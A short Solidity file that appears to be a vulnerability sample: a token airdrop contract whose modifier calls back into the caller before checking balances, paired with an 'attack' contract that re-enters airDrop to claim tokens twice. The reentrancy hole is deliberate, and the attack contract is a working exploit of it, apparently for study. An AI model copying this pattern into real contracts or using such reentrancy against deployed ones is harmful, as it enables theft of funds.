pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() hasNoBalance supportsToken public {
    updateTokenBalance(msg.sender, getTokenIncrement());
  }

  modifier supportsToken() {
    require(getTokenHash() == Bank(msg.sender).supportsToken());
    _;
  }

  modifier hasNoBalance {
    require(getBalance(msg.sender) == 0);
    _;
  }

  function getBalance(address addr) internal view returns (uint) {
    return tokenBalance[addr];
  }

  function updateTokenBalance(address addr, uint amount) internal {
    tokenBalance[addr] += amount;
  }

  function getTokenIncrement() internal pure returns (uint) {
    return 20;
  }

  function getTokenHash() internal pure returns (bytes32) {
    return keccak256(abi.encodePacked("Nu Token"));
  }
}

contract Bank {
  function supportsToken() external pure returns(bytes32) {
    return keccak256(abi.encodePacked("Nu Token"));
  }
}

contract attack {
  bool hasBeenCalled;

  function supportsToken() external returns(bytes32) {
    if (!hasBeenCalled) {
      hasBeenCalled = true;
      ModifierEntrancy(msg.sender).airDrop();
    }
    return keccak256(abi.encodePacked("Nu Token"));
  }

  function call(address token) public {
    ModifierEntrancy(token).airDrop();
  }
}